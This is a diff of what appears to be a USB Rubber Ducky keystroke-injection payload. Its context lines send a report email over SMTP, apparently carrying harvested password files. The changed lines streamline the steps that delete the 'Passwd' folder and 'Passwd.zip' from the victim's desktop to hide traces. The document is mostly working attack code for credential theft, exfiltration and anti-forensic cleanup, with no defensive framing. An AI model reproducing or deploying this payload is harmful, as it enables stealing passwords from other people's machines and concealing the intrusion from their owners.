@@ -43,23 +43,12 @@ ENTER
 STRING $SMTPInfo.Send($ReportEmail)
 ENTER
 DELAY 4500
-STRING del "C:\Users\$env:UserName\Desktop\Passwd"
+STRING del "C:\Users\$env:UserName\Desktop\Passwd" -Recurse
 ENTER
-A
-ENTER
-exit
+STRING exit
 ENTER
 DELAY 500
 GUI r
-DELAy 500
-ENTER
-DELAY 750
-STRING powershell
-ENTER
 DELAY 500
-STRING cd "C:\Users\$env:UserName\Desktop"
-ENTER
-STRING rm Passwd.zip
-ENTER
-STRING exit
+STRING powershell rm "C:\Users\$env:UserName\Desktop\Passwd.zip"
 ENTER
